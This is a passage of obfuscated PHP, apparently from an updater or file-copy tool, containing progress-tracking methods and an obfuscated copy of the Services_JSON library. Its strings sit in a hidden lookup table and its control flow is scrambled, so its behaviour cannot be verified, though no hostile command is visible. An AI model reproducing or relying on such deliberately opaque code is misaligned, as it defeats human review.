$this->task; $eÁ‚°Íïµ[$AÊœâ³Ôå²[1484]] = $dƒƒÍ«âÙÒ[$AÊœâ³Ôå²[28]]; $eÁ‚°Íïµ[$AÊœâ³Ôå²[981]] = $dƒƒÍ«âÙÒ[$AÊœâ³Ôå²[28]]; $this->update(); } public function copyFileStart($fù¸¾ßŒµ, $Eµ¹¹â·‹ƒ, $C”åÈ†¿ÉÂ, $FÈÍµÂ¶‡ï, $FØª¿•¾°‡, $aŸø†©“İ‹) { goto f¥¥…‰ƒˆù; f¥¥…‰ƒˆù: $fãèõŒ™¤í =& $_SERVER[¦·]; $aŠ´»’‰¦ = $FØª¿•¾°‡; if ($aŠ´»’‰¦ == $GLOBALS[$fãèõŒ™¤í[1497]]) { $aŠ´»’‰¦ = $GLOBALS[$fãèõŒ™¤í[1498]]; } goto aïôç¸À; aïôç¸À: $GLOBALS[$fãèõŒ™¤í[1498]] = $FØª¿•¾°‡; $GLOBALS[$fãèõŒ™¤í[1497]] = $aŸø†©“İ‹; $dØ¼Û‚‘Å± =& $this->task; goto fÇÜ¤†ğë‡; e­ ò¸´ÆÈ: $dØ¼Û‚‘Å±[$fãèõŒ™¤í[981]] = $fãèõŒ™¤í[33]; $dØ¼Û‚‘Å±[$fãèõŒ™¤í[1488]] = $fãèõŒ™¤í[33]; $dØ¼Û‚‘Å±[$fãèõŒ™¤í[1489]] = 0; goto BŸÁ É‘æ–; fÇÜ¤†ğë‡: $dØ¼Û‚‘Å±[$fãèõŒ™¤í[1484]] = $aŠ´»’‰¦; $dØ¼Û‚‘Å±[$fãèõŒ™¤í[1486]] = (int) $fù¸¾ßŒµ->size($Eµ¹¹â·‹ƒ); $dØ¼Û‚‘Å±[$fãèõŒ™¤í[1487]] = 0; goto e­ ò¸´ÆÈ; BŸÁ É‘æ–: $this->update(); goto c¨ËŒŠŠîÌ; c¨ËŒŠŠîÌ: } public function copyFileEnd($Föœ¨½”«™, $e·™ö˜â‚Û, $B×ˆ›á¾Æ, $AñíìŠ´ğœ, $aß¸¾˜£­, $eåÈ–ÏŠùâ) { $A†ŒÒ¦ø½² =& $_SERVER[¦·]; $DËŸì‚…¿ç =& $this->task; $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1487]] = $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1486]]; $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1488]] = $A†ŒÒ¦ø½²[33]; if ($aß¸¾˜£­ == $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1484]]) { $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1490]] += $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1486]]; $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1491]] = $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1490]]; $this->update(1); } else { $this->update(); $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1487]] = 0; } self::log($A†ŒÒ¦ø½²[1499] . $e·™ö˜â‚Û . $A†ŒÒ¦ø½²[66] . $AñíìŠ´ğœ . $A†ŒÒ¦ø½²[217] . $aß¸¾˜£­ . $A†ŒÒ¦ø½²[1500] . $DËŸì‚…¿ç[$A†ŒÒ¦ø½²[1484]]); } public function updateFileEnd($f»ó­ÜÌÆŒ, $Fò½÷‚°Ù’) { goto aÜÕ•ä…†Ã; b²¡šî¬‹: $this->update(1); self::log($eß˜˜¥öÊÚ[1501] . $f»ó­ÜÌÆŒ); goto F‚âÀõÌä; aÜÕ•ä…†Ã: $eß˜˜¥öÊÚ =& $_SERVER[¦·]; $dÙæ’¨½‰ =& $this->task; $dÙæ’¨½‰[$eß˜˜¥öÊÚ[1484]] = $f»ó­ÜÌÆŒ; goto eæàºïäÖ; eæàºïäÖ: $dÙæ’¨½‰[$eß˜˜¥öÊÚ[1486]] = $Fò½÷‚°Ù’; $dÙæ’¨½‰[$eß˜˜¥öÊÚ[1490]] += $Fò½÷‚°Ù’; $dÙæ’¨½‰[$eß˜˜¥öÊÚ[1491]] = $dÙæ’¨½‰[$eß˜˜¥öÊÚ[1490]]; goto b²¡šî¬‹; F‚âÀõÌä: } public function sourceModelCopy($bˆ·ñÂééÊ) { goto føÚˆØó–¹; føÚˆØó–¹: $Câ£‡Ë§ÒÙ =& $_SERVER[¦·]; $bÓÃ¥†ÉÜ‚ = $bˆ·ñÂééÊ[0]; $A”íì–”² = $bˆ·ñÂééÊ[1]; goto D®¡›Œáåç; D®¡›Œáåç: $fé—áÆŠ£Ë =& $this->task; $this->sourceModelCopyFlag = !0; $cÛÅß…ÜÌ· = 0; goto A¾Œç‘«ÛÀ; A¾Œç‘«ÛÀ: switch ($bÓÃ¥†ÉÜ‚) { case $Câ£‡Ë§ÒÙ[509]: $cÛÅß…ÜÌ· = 1; break; case $Câ£‡Ë§ÒÙ[512]: $fé—áÆŠ£Ë[$Câ£‡Ë§ÒÙ[1484]] = $A”íì–”²[$Câ£‡Ë§ÒÙ[28]]; break; case $Câ£‡Ë§ÒÙ[514]: $cÛÅß…ÜÌ· = intval($bˆ·ñÂééÊ[$Câ£‡Ë§ÒÙ[363]] * 0.4); break; case $Câ£‡Ë§ÒÙ[516]: $cÛÅß…ÜÌ· = intval($bˆ·ñÂééÊ[$Câ£‡Ë§ÒÙ[363]] * 0.2); break; case $Câ£‡Ë§ÒÙ[518]: $cÛÅß…ÜÌ· = intval($bˆ·ñÂééÊ[$Câ£‡Ë§ÒÙ[363]] * 0.4); break; } $this->update($cÛÅß…ÜÌ·); $this->sourceModelCopyFlag = !1; goto cÎÅ¸•‹; cÎÅ¸•‹: } public function sourceRemove($BÖĞ“éË†ˆ, $bí„ÕØóŞ¦) { $B‡Ô„íÈ¹ =& $_SERVER[¦·]; $this->sourceModelCopyFlag = !0; $DäÊŠŠ˜Ä = 1; if (isset($BÖĞ“éË†ˆ[$B‡Ô„íÈ¹[80]])) { $DäÊŠŠ˜Ä = $BÖĞ“éË†ˆ[$B‡Ô„íÈ¹[80]][$B‡Ô„íÈ¹[78]] + $BÖĞ“éË†ˆ[$B‡Ô„íÈ¹[80]][$B‡Ô„íÈ¹[79]] + 1; } $this->update($DäÊŠŠ˜Ä); $this->sourceModelCopyFlag = !1; } public function sourceMove($Bï†Äš‡ô‡) { $this->sourceRemove($Bï†Äš‡ô‡, !1); } public function curlProgress($FåÃåíÓğè, $eÆŒºó‰‰í, $BèÖİ¥ø¿ë, $bÊ–æéÃåª, $DËóÛÒš®) { $bø¢çî§Ãƒ =& $_SERVER[¦·]; $fóÁå­Ï§‡ =& $this->task; if ($DËóÛÒš® > 0) { $fóÁå­Ï§‡[$bø¢çî§Ãƒ[981]] = $bø¢çî§Ãƒ[1502]; $fóÁå­Ï§‡[$bø¢çî§Ãƒ[1488]] = $bø¢çî§Ãƒ[103]; if ($fóÁå­Ï§‡[$bø¢çî§Ãƒ[1486]] == $bÊ–æéÃåª || $bÊ–æéÃåª > 1024 * 1024) { $fóÁå­Ï§‡[$bø¢çî§Ãƒ[1487]] = $DËóÛÒš®; } if ($fóÁå­Ï§‡[$bø¢çî§Ãƒ[1489]]) { $fóÁå­Ï§‡[$bø¢çî§Ãƒ[1487]] = $DËóÛÒš® + $fóÁå­Ï§‡[$bø¢çî§Ãƒ[1489]]; } } else { if ($BèÖİ¥ø¿ë > 0) { if ($fóÁå­Ï§‡[$bø¢çî§Ãƒ[1486]] == $eÆŒºó‰‰í) { $fóÁå­Ï§‡[$bø¢çî§Ãƒ[1487]] = $BèÖİ¥ø¿ë; $fóÁå­Ï§‡[$bø¢çî§Ãƒ[981]] = $bø¢çî§Ãƒ[1503]; $fóÁå­Ï§‡[$bø¢çî§Ãƒ[1488]] = $bø¢çî§Ãƒ[1043]; } } } $this->update(); } public function curlProgressStart($E¯òï›çî) { } public function curlProgressEnd($b‰²¹İİ¯) { $fğà„¬×°‡ =& $_SERVER[¦·]; $BÉªŸ¹ =& $this->task; $aˆí²¾š¯½ = curl_getinfo($b‰²¹İİ¯); $DÙ¢ã–šÍ÷ = $aˆí²¾š¯½[$fğà„¬×°‡[1504]]; if ($BÉªŸ¹[$fğà„¬×°‡[1488]] == $fğà„¬×°‡[103] && $DÙ¢ã–šÍ÷) { $BÉªŸ¹[$fğà„¬×°‡[1489]] += $DÙ¢ã–šÍ÷; } $this->update(); } } goto eåŞ¯æİñ; cƒ§‰²¨ñë: class Services_JSON { function __construct($aóºæŠÒê” = 0) { $this->use = $aóºæŠÒê”; } function utf162utf8($b±“Ğì©–Å) { $eé·öèƒ¾á =& $_SERVER[¦·]; if (function_exists($eé·öèƒ¾á[68])) { return mb_convert_encoding($b±“Ğì©–Å, $eé·öèƒ¾á[1594], $eé·öèƒ¾á[1946]); } $D‚ñ¸ÒğîÛ = ord($b±“Ğì©–Å[0]) << 8 | ord($b±“Ğì©–Å[1]); switch (!0) { case (127 & $D‚ñ¸ÒğîÛ) == $D‚ñ¸ÒğîÛ: return chr(127 & $D‚ñ¸ÒğîÛ); case (2047 & $D‚ñ¸ÒğîÛ) == $D‚ñ¸ÒğîÛ: return chr(192 | $D‚ñ¸ÒğîÛ >> 6 & 31) . chr(128 | $D‚ñ¸ÒğîÛ & 63); case (65535 & $D‚ñ¸ÒğîÛ) == $D‚ñ¸ÒğîÛ: return chr(224 | $D‚ñ¸ÒğîÛ >> 12 & 15) . chr(128 | $D‚ñ¸ÒğîÛ >> 6 & 63) . chr(128 | $D‚ñ¸ÒğîÛ & 63); } return $eé·öèƒ¾á[33]; } function utf82utf16($Bñ†àÏõÑÄ) { $D’Ô‚ÍÅÉñ =& $_SERVER[¦·]; if (function_exists($D’Ô‚ÍÅÉñ[68])) { return mb_convert_encoding($Bñ†àÏõÑÄ, $D’Ô‚ÍÅÉñ[1946], $D’Ô‚ÍÅÉñ[1594]); } switch (strlen($Bñ†àÏõÑÄ)) { case 1: return $Bñ†àÏõÑÄ; case 2: return chr(7 & ord($Bñ†àÏõÑÄ[0]) >> 2) . chr(192 & ord($Bñ†àÏõÑÄ[0]) << 6 | 63 & ord($Bñ†àÏõÑÄ[1])); case 3: return chr(240 & ord($Bñ†àÏõÑÄ[0]) << 4 | 15 & ord($Bñ†àÏõÑÄ[1]) >> 2) . chr(192 & ord($Bñ†àÏõÑÄ[1]) << 6 | 127 & ord($Bñ†àÏõÑÄ[2])); } return $D’Ô‚ÍÅÉñ[33]; } function encode($E¾ÆÏ‹£¡) { $f›åÏí²Ñé =& $_SERVER[¦·]; switch (gettype($E¾ÆÏ‹£¡)) { case $f›åÏí²Ñé[1605]: return $E¾ÆÏ‹£¡ ? $f›åÏí²Ñé[1604] : $f›åÏí²Ñé[1606]; case $f›åÏí²Ñé[1947]: return $f›åÏí²Ñé[99]; case $f›åÏí²Ñé[303]: return (int) $E¾ÆÏ‹£¡; case $f›åÏí²Ñé[278]: case $f›åÏí²Ñé[277]: return (double) $E¾ÆÏ‹£¡; case $f›åÏí²Ñé[312]: $d„Ì”Óí§Ø = $f›åÏí²Ñé[33]; $AŒ®ŠÃÕš = strlen($E¾ÆÏ‹£¡); for ($bº¡±›Âš¹ = 0; $bº¡±›Âš¹ < $AŒ®ŠÃÕš; ++$bº¡±›Âš¹) { $eĞ—†¢ÎŠÃ = ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹]); switch (!0) { case $eĞ—†¢ÎŠÃ == 8: $d„Ì”Óí§Ø .= $f›åÏí²Ñé[1948]; break; case $eĞ—†¢ÎŠÃ == 9: $d„Ì”Óí§Ø .= $f›åÏí²Ñé[1581]; break; case $eĞ—†¢ÎŠÃ == 10: $d„Ì”Óí§Ø .= $f›åÏí²Ñé[1579]; break; case $eĞ—†¢ÎŠÃ == 12: $d„Ì”Óí§Ø .= $f›åÏí²Ñé[1949]; break; case $eĞ—†¢ÎŠÃ == 13: $d„Ì”Óí§Ø .= $f›åÏí²Ñé[1580]; break; case $eĞ—†¢ÎŠÃ == 34: case $eĞ—†¢ÎŠÃ == 47: case $eĞ—†¢ÎŠÃ == 92: $d„Ì”Óí§Ø .= $f›åÏí²Ñé[93] . $E¾ÆÏ‹£¡[$bº¡±›Âš¹]; break; case $eĞ—†¢ÎŠÃ >= 32 && $eĞ—†¢ÎŠÃ <= 127: $d„Ì”Óí§Ø .= $E¾ÆÏ‹£¡[$bº¡±›Âš¹]; break; case ($eĞ—†¢ÎŠÃ & 224) == 192: $cÚ˜Äœ¨ˆ¡ = pack($f›åÏí²Ñé[1950], $eĞ—†¢ÎŠÃ, ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 1])); $bº¡±›Âš¹ += 1; $CÅì¿­ŸŒÕ = $this->utf82utf16($cÚ˜Äœ¨ˆ¡); $d„Ì”Óí§Ø .= sprintf($f›åÏí²Ñé[1951], bin2hex($CÅì¿­ŸŒÕ)); break; case ($eĞ—†¢ÎŠÃ & 240) == 224: $cÚ˜Äœ¨ˆ¡ = pack($f›åÏí²Ñé[1950], $eĞ—†¢ÎŠÃ, ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 1]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 2])); $bº¡±›Âš¹ += 2; $CÅì¿­ŸŒÕ = $this->utf82utf16($cÚ˜Äœ¨ˆ¡); $d„Ì”Óí§Ø .= sprintf($f›åÏí²Ñé[1951], bin2hex($CÅì¿­ŸŒÕ)); break; case ($eĞ—†¢ÎŠÃ & 248) == 240: $cÚ˜Äœ¨ˆ¡ = pack($f›åÏí²Ñé[1950], $eĞ—†¢ÎŠÃ, ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 1]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 2]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 3])); $bº¡±›Âš¹ += 3; $CÅì¿­ŸŒÕ = $this->utf82utf16($cÚ˜Äœ¨ˆ¡); $d„Ì”Óí§Ø .= sprintf($f›åÏí²Ñé[1951], bin2hex($CÅì¿­ŸŒÕ)); break; case ($eĞ—†¢ÎŠÃ & 252) == 248: $cÚ˜Äœ¨ˆ¡ = pack($f›åÏí²Ñé[1950], $eĞ—†¢ÎŠÃ, ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 1]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 2]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 3]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 4])); $bº¡±›Âš¹ += 4; $CÅì¿­ŸŒÕ = $this->utf82utf16($cÚ˜Äœ¨ˆ¡); $d„Ì”Óí§Ø .= sprintf($f›åÏí²Ñé[1951], bin2hex($CÅì¿­ŸŒÕ)); break; case ($eĞ—†¢ÎŠÃ & 254) == 252: $cÚ˜Äœ¨ˆ¡ = pack($f›åÏí²Ñé[1950], $eĞ—†¢ÎŠÃ, ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 1]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 2]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 3]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 4]), ord($E¾ÆÏ‹£¡[$bº¡±›Âš¹ + 5])); $bº¡±›Âš¹ += 5; $CÅì¿­ŸŒÕ = $this->utf82utf16($cÚ˜Äœ¨ˆ¡); $d„Ì”Óí§Ø .= sprintf($f›åÏí²Ñé[1951], bin2hex($CÅì¿­ŸŒÕ)); break; } } return $f›åÏí²Ñé[113] . $d„Ì”Óí§Ø . $f›åÏí²Ñé[113]; case $f›åÏí²Ñé[1952]: if (is_array($E¾ÆÏ‹£¡) && count($E¾ÆÏ‹£¡) && array_keys($E¾ÆÏ‹£¡) !== range(0, sizeof($E¾ÆÏ‹£¡) - 1)) { $dÚÅËÔ‘á = array_map(array($this, $f›åÏí²Ñé[1953]), array_keys($E¾ÆÏ‹£¡), array_values($E¾ÆÏ‹£¡)); foreach ($dÚÅËÔ‘á as $dÙ›ÂŞğ§Ï) { if (Services_JSON::isError($dÙ›ÂŞğ§Ï)) { return $dÙ›ÂŞğ§Ï; } } return $f›åÏí²Ñé[1071] . join($f›åÏí²Ñé[47], $dÚÅËÔ‘á) . $f›åÏí²Ñé[315]; } $BÌ–‡õÍËÍ = array_map(array($this, $f›åÏí²Ñé[1954]), $E¾ÆÏ‹£¡); foreach ($BÌ–‡õÍËÍ as $BĞ£”Ğö¹) { if (Services_JSON::isError($BĞ£”Ğö¹)) { return $BĞ£”Ğö¹; } } return $f›åÏí²Ñé[157] . join($f›åÏí²Ñé[47], $BÌ–‡õÍËÍ) . $f›åÏí²Ñé[478]; case $f›åÏí²Ñé[1955]: $a«¢ƒ—‚Ôˆ = get_object_vars($E¾ÆÏ‹£¡); $dÚÅËÔ‘á = array_map(array($this, $f›åÏí²Ñé[1953]), array_keys($a«¢ƒ—‚Ôˆ), array_values($a«¢ƒ—‚Ôˆ)); foreach ($dÚÅËÔ‘á as $dÙ›ÂŞğ§Ï) { if (Services_JSON::isError($dÙ›ÂŞğ§Ï)) { return $dÙ›ÂŞğ§Ï; } } return $f›åÏí²Ñé[1071] . join($f›åÏí²Ñé[47], $dÚÅËÔ‘á) . $f›åÏí²Ñé[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $f›åÏí²Ñé[99] : new Services_JSON_Error(gettype($E¾ÆÏ‹£¡) . $f›åÏí²Ñé[1956]); } } function name_value($BÅ›«ê‘—å, $DĞ÷Ö›âÄ) { $DÛâº™îÓ = $this->encode($DĞ÷Ö›âÄ); if (Services_JSON::isError($DÛâº™îÓ)) { return $DÛâº™îÓ; } return $this->encode(strval($BÅ›«ê‘—å)) . $_SERVER[¦·][4] . $DÛâº™îÓ; } function reduce_string($E™¨ãÈÒ‘Æ) { $cÇ—Ÿš¨· =& $_SERVER[¦·]; $E™¨ãÈÒ‘Æ = preg_replace(array($cÇ—Ÿš¨·[1957], $cÇ—Ÿš¨·[1958], $cÇ—Ÿš¨·[1959]), $cÇ—Ÿš¨·[33], $E™¨ãÈÒ‘Æ); return trim($E™¨ãÈÒ‘Æ); } function decode($b­Õ±÷Š½ğ) { $aá‡Ò‚İ„© =& $_SERVER[¦·]; $b­Õ±÷Š½ğ = $this->reduce_string($b­Õ±÷Š½ğ); switch (strtolower($b­Õ±÷Š½ğ)) { case $aá‡Ò‚İ„©[1604]: return !0; case $aá‡Ò‚İ„©[1606]: return !1; case $aá‡Ò‚İ„©[99]: return null; default: $Aà³ØÜæàÌ = array(); if (is_numeric($b­Õ±÷Š½ğ)) { return (double) $b­Õ±÷Š½ğ == (int) $b­Õ±÷Š½ğ ? (int) $b­Õ±÷Š½ğ : (double) $b­Õ±÷Š½ğ; } elseif (preg_match($aá‡Ò‚İ„©[1960], $b­Õ±÷Š½ğ, $Aà³ØÜæàÌ) && $Aà³ØÜæàÌ[1] == $Aà³ØÜæàÌ[2]) { $dÙ®×µêÜ— = substr($b­Õ±÷Š½ğ, 0, 1); $F‚‰˜£«‡ = substr($b­Õ±÷Š½ğ, 1, -1); $d™—÷©Öê = $aá‡Ò‚İ„©[33]; $Aƒ‚µ­¾İÚ = strlen($F‚‰˜£«‡); for ($F¬È½”‹é = 0; $F¬È½”‹é < $Aƒ‚µ­¾İÚ; ++$F¬È½”‹é) { $bƒÎŞ¡ŒÜÇ = substr($F‚‰˜£«‡, $F¬È½”‹é, 2); $e¶ŠéËÁ¿ = ord($F‚‰˜£«‡[$F¬È½”‹é]); switch (!0) { case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1948]: $d™—÷©Öê .= chr(8); ++$F¬È½”‹é; break; case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1581]: $d™—÷©Öê .= chr(9); ++$F¬È½”‹é; break; case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1579]: $d™—÷©Öê .= chr(10); ++$F¬È½”‹é; break; case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1949]: $d™—÷©Öê .= chr(12); ++$F¬È½”‹é; break; case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1580]: $d™—÷©Öê .= chr(13); ++$F¬È½”‹é; break; case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1361]: case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1961]: case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1574]: case $bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1576]: if ($dÙ®×µêÜ— == $aá‡Ò‚İ„©[113] && $bƒÎŞ¡ŒÜÇ != $aá‡Ò‚İ„©[1961] || $dÙ®×µêÜ— == $aá‡Ò‚İ„©[55] && $bƒÎŞ¡ŒÜÇ != $aá‡Ò‚İ„©[1361]) { $d™—÷©Öê .= $F‚‰˜£«‡[++$F¬È½”‹é]; } break; case preg_match($aá‡Ò‚İ„©[1962], substr($F‚‰˜£«‡, $F¬È½”‹é, 6)): $BŸäÄØ‘ÎÛ = chr(hexdec(substr($F‚‰˜£«‡, $F¬È½”‹é + 2, 2))) . chr(hexdec(substr($F‚‰˜£«‡, $F¬È½”‹é + 4, 2))); $d™—÷©Öê .= $this->utf162utf8($BŸäÄØ‘ÎÛ); $F¬È½”‹é += 5; break; case $e¶ŠéËÁ¿ >= 32 && $e¶ŠéËÁ¿ <= 127: $d™—÷©Öê .= $F‚‰˜£«‡[$F¬È½”‹é]; break; case ($e¶ŠéËÁ¿ & 224) == 192: $d™—÷©Öê .= substr($F‚‰˜£«‡, $F¬È½”‹é, 2); ++$F¬È½”‹é; break; case ($e¶ŠéËÁ¿ & 240) == 224: $d™—÷©Öê .= substr($F‚‰˜£«‡, $F¬È½”‹é, 3); $F¬È½”‹é += 2; break; case ($e¶ŠéËÁ¿ & 248) == 240: $d™—÷©Öê .= substr($F‚‰˜£«‡, $F¬È½”‹é, 4); $F¬È½”‹é += 3; break; case ($e¶ŠéËÁ¿ & 252) == 248: $d™—÷©Öê .= substr($F‚‰˜£«‡, $F¬È½”‹é, 5); $F¬È½”‹é += 4; break; case ($e¶ŠéËÁ¿ & 254) == 252: $d™—÷©Öê .= substr($F‚‰˜£«‡, $F¬È½”‹é, 6); $F¬È½”‹é += 5; break; } } return $d™—÷©Öê; } elseif (preg_match($aá‡Ò‚İ„©[1963], $b­Õ±÷Š½ğ) || preg_match($aá‡Ò‚İ„©[1964], $b­Õ±÷Š½ğ)) { goto C”¤ƒËÊÀ‘; BæÕ×¸Œˆ: $F‚‰˜£«‡ = $this->reduce_string($F‚‰˜£«‡); if ($F‚‰˜£«‡ == $aá‡Ò‚İ„©[33]) { if (reset($FÎ‚ ÔË¦¥) == SERVICES_JSON_IN_ARR) { return $aØÃÔ¥Ş; } else { return $FÓëÁ š‹; } } $Aƒ‚µ­¾İÚ = strlen($F‚‰˜£«‡); goto dÛµĞ—Ş¸ö; C”¤ƒËÊÀ‘: if ($b­Õ±÷Š½ğ[0] == $aá‡Ò‚İ„©[157]) { $FÎ‚ ÔË¦¥ = array(SERVICES_JSON_IN_ARR); $aØÃÔ¥Ş = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÎ‚ ÔË¦¥ = array(SERVICES_JSON_IN_OBJ); $FÓëÁ š‹ = array(); } else { $FÎ‚ ÔË¦¥ = array(SERVICES_JSON_IN_OBJ); $FÓëÁ š‹ = new stdClass(); } } array_push($FÎ‚ ÔË¦¥, array($aá‡Ò‚İ„©[1965] => SERVICES_JSON_SLICE, $aá‡Ò‚İ„©[263] => 0, $aá‡Ò‚İ„©[1966] => !1)); $F‚‰˜£«‡ = substr($b­Õ±÷Š½ğ, 1, -1); goto BæÕ×¸Œˆ; dÛµĞ—Ş¸ö: for ($F¬È½”‹é = 0; $F¬È½”‹é <= $Aƒ‚µ­¾İÚ; ++$F¬È½”‹é) { $bÒ¶çœÙ¬¹ = end($FÎ‚ ÔË¦¥); $bƒÎŞ¡ŒÜÇ = substr($F‚‰˜£«‡, $F¬È½”‹é, 2); if ($F¬È½”‹é == $Aƒ‚µ­¾İÚ || $F‚‰˜£«‡[$F¬È½”‹é] == $aá‡Ò‚İ„©[47] && $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]] == SERVICES_JSON_SLICE) { $aŞœ£ŠÀ³å = substr($F‚‰˜£«‡, $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[263]], $F¬È½”‹é - $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[263]]); array_push($FÎ‚ ÔË¦¥, array($aá‡Ò‚İ„©[1965] => SERVICES_JSON_SLICE, $aá‡Ò‚İ„©[263] => $F¬È½”‹é + 1, $aá‡Ò‚İ„©[1966] => !1)); if (reset($FÎ‚ ÔË¦¥) == SERVICES_JSON_IN_ARR) { array_push($aØÃÔ¥Ş, $this->decode($aŞœ£ŠÀ³å)); } elseif (reset($FÎ‚ ÔË¦¥) == SERVICES_JSON_IN_OBJ) { $F›Ø‰»‚Û = array(); if (preg_match($aá‡Ò‚İ„©[1967], $aŞœ£ŠÀ³å, $F›Ø‰»‚Û)) { $cå‚·Æõƒâ = $this->decode($F›Ø‰»‚Û[1]); $Dá°˜×âÕ­ = $this->decode($F›Ø‰»‚Û[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÓëÁ š‹[$cå‚·Æõƒâ] = $Dá°˜×âÕ­; } else { $FÓëÁ š‹->{$cå‚·Æõƒâ} = $Dá°˜×âÕ­; } } elseif (preg_match($aá‡Ò‚İ„©[1968], $aŞœ£ŠÀ³å, $F›Ø‰»‚Û)) { $cå‚·Æõƒâ = $F›Ø‰»‚Û[1]; $Dá°˜×âÕ­ = $this->decode($F›Ø‰»‚Û[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÓëÁ š‹[$cå‚·Æõƒâ] = $Dá°˜×âÕ­; } else { $FÓëÁ š‹->{$cå‚·Æõƒâ} = $Dá°˜×âÕ­; } } } } elseif (($F‚‰˜£«‡[$F¬È½”‹é] == $aá‡Ò‚İ„©[113] || $F‚‰˜£«‡[$F¬È½”‹é] == $aá‡Ò‚İ„©[55]) && $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]] != SERVICES_JSON_IN_STR) { array_push($FÎ‚ ÔË¦¥, array($aá‡Ò‚İ„©[1965] => SERVICES_JSON_IN_STR, $aá‡Ò‚İ„©[263] => $F¬È½”‹é, $aá‡Ò‚İ„©[1966] => $F‚‰˜£«‡[$F¬È½”‹é])); } elseif ($F‚‰˜£«‡[$F¬È½”‹é] == $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1966]] && $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]] == SERVICES_JSON_IN_STR && (strlen(substr($F‚‰˜£«‡, 0, $F¬È½”‹é)) - strlen(rtrim(substr($F‚‰˜£«‡, 0, $F¬È½”‹é), $aá‡Ò‚İ„©[93]))) % 2 != 1) { array_pop($FÎ‚ ÔË¦¥); } elseif ($F‚‰˜£«‡[$F¬È½”‹é] == $aá‡Ò‚İ„©[157] && in_array($bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($FÎ‚ ÔË¦¥, array($aá‡Ò‚İ„©[1965] => SERVICES_JSON_IN_ARR, $aá‡Ò‚İ„©[263] => $F¬È½”‹é, $aá‡Ò‚İ„©[1966] => !1)); } elseif ($F‚‰˜£«‡[$F¬È½”‹é] == $aá‡Ò‚İ„©[478] && $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]] == SERVICES_JSON_IN_ARR) { array_pop($FÎ‚ ÔË¦¥); } elseif ($F‚‰˜£«‡[$F¬È½”‹é] == $aá‡Ò‚İ„©[1071] && in_array($bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($FÎ‚ ÔË¦¥, array($aá‡Ò‚İ„©[1965] => SERVICES_JSON_IN_OBJ, $aá‡Ò‚İ„©[263] => $F¬È½”‹é, $aá‡Ò‚İ„©[1966] => !1)); } elseif ($F‚‰˜£«‡[$F¬È½”‹é] == $aá‡Ò‚İ„©[315] && $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]] == SERVICES_JSON_IN_OBJ) { array_pop($FÎ‚ ÔË¦¥); } elseif ($bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1969] && in_array($bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($FÎ‚ ÔË¦¥, array($aá‡Ò‚İ„©[1965] => SERVICES_JSON_IN_CMT, $aá‡Ò‚İ„©[263] => $F¬È½”‹é, $aá‡Ò‚İ„©[1966] => !1)); $F¬È½”‹é++; } elseif ($bƒÎŞ¡ŒÜÇ == $aá‡Ò‚İ„©[1970] && $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[1965]] == SERVICES_JSON_IN_CMT) { array_pop($FÎ‚ ÔË¦¥); $F¬È½”‹é++; for ($E‚ã…Õ‘Š = $bÒ¶çœÙ¬¹[$aá‡Ò‚İ„©[263]]; $E‚ã…Õ‘Š <= $F¬È½”‹é; ++$E‚ã…Õ‘Š) { $F‚‰˜£«‡ = substr_replace($F‚‰˜£«‡, $aá‡Ò‚İ„©[50], $E‚ã…Õ‘Š, 1); } } } if (reset($FÎ‚ ÔË¦¥) == SERVICES_JSON_IN_ARR) { return $aØÃÔ¥Ş; } 